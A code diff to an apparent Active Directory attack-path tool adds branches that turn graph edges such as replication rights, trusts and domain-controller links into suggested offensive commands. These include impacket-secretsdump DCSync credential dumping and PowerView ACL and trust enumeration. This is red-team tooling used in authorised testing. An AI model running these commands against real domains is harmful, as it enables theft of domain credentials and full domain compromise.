@@ -102,6 +102,48 @@ class CommandOracle:
                 "-just-dc"
             )
 
+        if normalized_edge in (
+            "GetChanges",
+            "GetChangesAll",
+            "GetChangesInFilteredSet",
+            "DS-Replication-Get-Changes",
+            "DS-Replication-Get-Changes-All",
+            "DS-Replication-Get-Changes-In-Filtered-Set",
+        ):
+            target_domain = target.name or "<TARGET_DOMAIN>"
+            return (
+                f"# {normalized_edge}: replication right detected on {target_domain}\n"
+                "# DCSync requires BOTH GetChanges and GetChangesAll on the same domain object\n"
+                "# Verify edge pair in graph, then execute DCSync:\n"
+                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC> -just-dc"
+            )
+
+        if normalized_edge == "Contains":
+            return (
+                "# Contains: parent container can influence child objects via inherited ACEs or linked GPOs\n"
+                "# Abuse is contextual: inspect inbound control on the parent, then pivot into child object abuse\n"
+                "# Suggested checks:\n"
+                "powershell -c \"Get-DomainObjectAcl -Identity '<PARENT_OBJECT>' -ResolveGUIDs\"\n"
+                "powershell -c \"Get-DomainOU -Identity '<PARENT_OU>' -Properties gplink\""
+            )
+
+        if normalized_edge == "CrossForestTrust":
+            return (
+                "# CrossForestTrust: trust relationship is not direct compromise by itself\n"
+                "# Enumerate trust settings, SID filtering, and delegation before selecting abuse path\n"
+                "powershell -c \"Get-DomainTrust -Identity '<SOURCE_DOMAIN>' -Domain '<SOURCE_DOMAIN>'\"\n"
+                "netdom trust <SOURCE_DOMAIN> /domain:<TARGET_DOMAIN> /verify"
+            )
+
+        if normalized_edge == "DCFor":
+            target_domain = target.name or "<TARGET_DOMAIN>"
+            return (
+                "# DCFor: source host is a Domain Controller for the target domain\n"
+                "# If you have administrative access on this DC, domain compromise is typically one step away\n"
+                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC_HOST> -just-dc\n"
+                f"# Target domain: {target_domain}"
+            )
+
         if normalized_edge == "GenericAll" and target.node_type == "computer":
             target_spn = target.spn or f"HOST/{target.name}"
             target_host = target.name or "<TARGET_COMPUTER>"
